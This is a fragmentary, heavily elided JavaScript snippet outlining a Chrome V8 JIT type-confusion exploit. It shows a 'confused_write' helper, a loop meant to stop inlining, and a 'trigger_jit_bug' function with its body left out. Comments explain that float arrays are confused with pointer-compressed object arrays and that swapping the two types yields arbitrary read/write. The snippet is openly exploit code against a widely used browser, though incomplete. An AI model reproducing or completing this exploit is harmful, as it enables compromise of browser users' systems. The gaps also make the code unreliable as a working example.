...
function confused_write(arr, idx, val) {
    for (var i = 0; i < 1; i++) //  Random loop to prevent inlining
    {
        i += 2;
    }
    arr[idx] = val;
...
// Important to trigger the JIT optimization
function trigger_jit_bug() {
    ...
    // confusing 64 bit float arrays and object arrays (which consist of 32 bit pointers due to pointer compression)
}

trigger_jit_bug(); // <-- Step 1: trigger JIT optimization, now all obj arrs treated at float arrs
...
// General Chrome Exploit // <-- Swap types between float/obj arr to get arbitrary read/write
